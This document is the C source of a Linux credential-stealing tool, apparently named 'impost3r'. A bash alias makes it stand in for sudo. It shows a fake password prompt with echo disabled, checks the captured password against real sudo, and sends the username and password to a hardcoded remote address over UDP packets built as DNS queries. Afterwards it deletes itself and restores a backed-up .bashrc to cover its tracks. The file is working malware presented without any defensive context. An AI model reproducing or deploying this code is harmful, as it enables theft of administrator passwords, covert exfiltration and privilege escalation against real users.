#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <termios.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "dns.h"
/* 
    Don't edit 
*/
# define BUFFER_LEN 2048
# define MAX_RETRY 3

/*
    Custom setting
*/
# define MAX_RESEND 30
# define RESEND_INTERVAL 5
# define FILENAME "/tmp/.impost3r"
# define BACKUP_BASHRC "/tmp/.bashrc"
# define REMOTE_ADDRESS "192.168.0.12"
# define REMOTE_PORT 8888

int successFlag = 1;

/*
    Usage：
        alias sudo='impost3r() {
        if [ -f "/tmp/.impost3r" ]; then
        /tmp/.impost3r "$@" && unalias sudo
        else
        unalias sudo;sudo "$@"
        fi
        }; impost3r'
*/

void 
sudo(char arguments[])
{
    char command[BUFFER_LEN] = {0};

    snprintf(command,BUFFER_LEN,"/usr/bin/sudo%s",arguments);
    system(command);
}

ssize_t 
steal_password(char **lineptr, size_t *n, FILE *stream)
{
    struct termios fakeTerminal, realTerminal;

    if (tcgetattr (fileno (stream), &realTerminal) != 0)
        return -1;

    fakeTerminal = realTerminal;
    fakeTerminal.c_lflag &= ~ECHO;

    if (tcsetattr (fileno (stream), TCSAFLUSH, &fakeTerminal) != 0)
        return -1;

    getline (lineptr, n, stream);

    tcsetattr (fileno (stream), TCSAFLUSH, &realTerminal);

    return 1;
}
void 
save_passwd(char *name,char *password,char *all, int success)
{
    char *status = NULL; 
    status = "success";

    if (!success)
    {
        status = "fail"; 
    }

    char text[BUFFER_LEN] = {0};
    snprintf(text, sizeof(text), "%s:%s:%s\n", name, password, status); 

    strcat(all,text);
}

void 
send_passwd(char *all)
{
    struct sockaddr_in evil;
    unsigned char *packet;
    int sockfd;
    unsigned int slen = sizeof(evil);

    if((sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
        return;
    }

    evil.sin_family = AF_INET;
    evil.sin_port   = htons(REMOTE_PORT);
    evil.sin_addr.s_addr = inet_addr(REMOTE_ADDRESS);
    memset(&evil.sin_zero, 0, sizeof(evil.sin_zero));

    DNS_header *header = create_header(); 
    DNS_question *question = create_question(all);
    size_t packet_length = build_packet(header, question, &packet);

    free(header);
    free(question);

    for (int i =0;i<MAX_RESEND;i++)
    {
       sendto(sockfd, packet, packet_length, 0, (struct sockaddr *) &evil, slen);

       fd_set fds;
       FD_ZERO(&fds);
       FD_SET(sockfd,&fds);
       struct timeval timeout;
       timeout.tv_sec = RESEND_INTERVAL;
       timeout.tv_usec = 0;

       int ok = select(sockfd+1,&fds,NULL,NULL,&timeout);
       if (ok >0)
       {
           return;
       }
    }
}

void 
clear_all(){
   char command[BUFFER_LEN] = {0};

   snprintf(command, sizeof(command), "mv %s ~/.bashrc > /dev/null 2>&1;rm %s > /dev/null 2>&1", BACKUP_BASHRC, FILENAME);

   system(command);
}

char * 
fake_sudo(struct passwd *usrInfo,int argc,char arguments[],char *params[])
{
    int retryTimes = 0;
    char testCommand[BUFFER_LEN] = {0};
    char *stealPasswd = NULL;
    static char allPasswd[1000];
    size_t len = 0;

    if (argc != 1)
    {
        while (retryTimes < MAX_RETRY)
        {
            printf("[sudo] password for %s: ", usrInfo->pw_name);
            steal_password(&stealPasswd,&len,stdin);

            int location =  strlen(stealPasswd)-1;
            if (stealPasswd[location] == '\n') stealPasswd[location] = '\0';

            snprintf(testCommand, sizeof(testCommand), "echo %s | /usr/bin/sudo -S whoami >/dev/null 2>&1",stealPasswd);
            printf("\n");

            int testret = system(testCommand);

            if (testret != 0)
            {
                if (retryTimes == MAX_RETRY-1)
                {
                    printf("sudo: %d incorrect password attempts\n", MAX_RETRY);
                    save_passwd(usrInfo->pw_name,stealPasswd,allPasswd,0);
                    return allPasswd;
                }

                printf("Sorry, try again.\n");
                save_passwd(usrInfo->pw_name,stealPasswd,allPasswd,0);
            }
            else
            {
               int pid = fork();
               if (pid == 0)
               {
                   successFlag = 0;
                   save_passwd(usrInfo->pw_name,stealPasswd,allPasswd,1);
                   return allPasswd;
               } 
               else
               {
                   execv("/usr/bin/sudo",params);
                   exit(0);
               }
            }
           retryTimes ++;
        }
        //free(stealPasswd);
    }
    else
    {
        sudo(arguments);
    }
    return NULL;
}

int 
need_password()
{
    int status;

    status = system("/usr/bin/sudo -n true 2>/dev/null");

    if (status == 256) {
        return 1;
    } else {
        return 0;
    }
}

void 
hijack_sudo(struct passwd *usrInfo,int argc,char arguments[],char *params[])
{
    if (usrInfo)
    {
        if (need_password())
        {
            char *all = fake_sudo(usrInfo,argc,arguments,params);
            if (!successFlag)
            {
                /*
                    尝试生成孤儿进程负责传输密码，主进程负责清场，防止阻塞
                */
                int pid = fork();
                if (pid == 0)
                {
                    send_passwd(all);
                }
                else
                {
                    clear_all();
                }
            }
        }
        else
        {
            sudo(arguments);
        }
    }
    else
    {
        sudo(arguments);
    }
}  

int 
main(int argc, char *argv[])
{
    struct passwd *usrInfo = getpwuid(getuid());

    char arguments[BUFFER_LEN] = {0};
    
    char *params[1000];

    for (int number = 1;number < argc;++number)
    {
        snprintf(arguments+strlen(arguments), sizeof(arguments)-strlen(arguments), " %s", argv[number]);
    }
    
    params[0]="sudo";

    for (int number = 1;number < argc;++number)
    {
        params[number] = argv[number];
    }

    hijack_sudo(usrInfo,argc,arguments,params);

    return successFlag;
}